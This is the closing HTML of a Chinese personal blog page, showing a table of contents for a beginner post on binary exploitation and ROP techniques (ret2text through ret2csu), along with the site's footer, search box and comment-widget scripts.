href="#PWN%E7%9B%B8%E5%85%B3%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">3.5.</span> <span class="toc-text">PWN相关名词解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98%E7%AE%80%E5%8D%95%E7%9A%84ROP"><span class="toc-number">4.</span> <span class="toc-text">签到题简单的ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2xxx%E7%B3%BB%E5%88%97%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.</span> <span class="toc-text">ret2xxx系列简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">4.2.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">4.3.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">4.4.</span> <span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">4.5.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89system%E6%9C%89-bin-sh"><span class="toc-number">4.5.1.</span> <span class="toc-text">有system有&#x2F;bin&#x2F;sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89system-%E6%97%A0-bin-sh"><span class="toc-number">4.5.2.</span> <span class="toc-text">有system 无&#x2F;bin&#x2F;sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0system-%E6%97%A0-bin-sh"><span class="toc-number">4.5.3.</span> <span class="toc-text">无system 无&#x2F;bin&#x2F;sh</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2csu%EF%BC%88%E4%B8%AD%E7%BA%A7ROP-64%E4%BD%8D%EF%BC%89"><span class="toc-number">4.6.</span> <span class="toc-text">ret2csu（中级ROP 64位）</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i class="fa-fw fas fa-heart card-announcement-animation cc_pointer"></i> MTRleed</div><div class="footer_custom_text">MTRleed|博客</div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2021,08,30,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='小 破 站 已 艰 难 营 业 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'DAdNksl9t4AvRRqv5LSI68Bw-gzGzoHsz',
      appKey: 'DxK0hMCcbzgfiNRktvLAWocH',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      placeholder: 'ヾﾉ≧∀≦)o 欢 迎 评 论 ! 填写QQ邮箱我就可以看到你的头像嗷~',
      path: window.location.pathname,
      master: '0e249a5357be07e34f42012d615f91c8',
      tagMeta:["博主","小伙伴","访客"],
      friends: ["5c0ed793d43436a166548845c8ffe455","d4f239a7347311d21f9658a44bc2d3f1"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>